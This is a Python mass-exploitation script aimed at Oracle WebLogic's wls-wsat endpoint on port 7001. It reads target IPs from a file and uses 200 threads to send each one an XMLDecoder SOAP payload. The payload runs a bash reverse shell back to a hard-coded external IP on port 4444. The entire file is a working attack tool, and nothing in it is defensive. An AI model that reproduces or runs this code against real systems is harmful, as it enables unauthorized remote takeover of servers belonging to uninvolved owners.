import requests
import sys
import queue
import threading
class test():
	def __init__(self):
		pass
	def post(self,ip):
		# with open(self.file,mode='rb') as f:
		# 	file=f.read()
		headers={
		'Accept-Encoding':'gzip, deflate',
		'Accept':'*/*',
		'Accept-Language':'en',
		'User-Agent':'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
		'Content-Type':'text/xml',
		'Connection':'close'
		}
		xml='''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java version="1.4.0" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>bash -i &gt;&amp; /dev/tcp/96.63.216.227/4444 0&gt;&amp;1</string>
</void>
</array>
<void method="start"/></void>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>'''
		target='http://'+ip+':7001'+'/wls-wsat/CoordinatorPortType'
		print(target)
		r=requests.post(target,headers=headers,data=xml)
		print(r.content)

	def worker(self,q):
		while not q.empty():
			ip=q.get()
			try:
				self.post(ip)
			finally:
				q.task_done()


if __name__ == '__main__':
	# print("Example: python postser.py 192.168.0.1 test.ser")
	# if len(sys.argv)!=3:
	# 	print("format wrong")
	# 	sys.exit()

	q=queue.Queue()
	a=test()
	ip=sys.argv[1]
	# file=sys.argv[2]
	# iplist=[]
	with open(ip,mode='rb') as ipf:
		for line in ipf.readlines():
			# print(line.decode('utf-8'))
			q.put(line.decode('utf-8')[:-2])
			# iplist.append(line.decode('utf-8'))
	threads=[threading.Thread(target=a.worker,args=(q,)) for i in range(200)]
	list(map(lambda x:x.start(),threads))
	q.join()
	print("scan over")
	# while not q.empty():
	# 		print(q.get())

		# print(str(ipf.readline()))
		# while q.put(ipf.readline())!=None:
		# 	print (q.get())

	# a=test(ip,file)
	# a.post()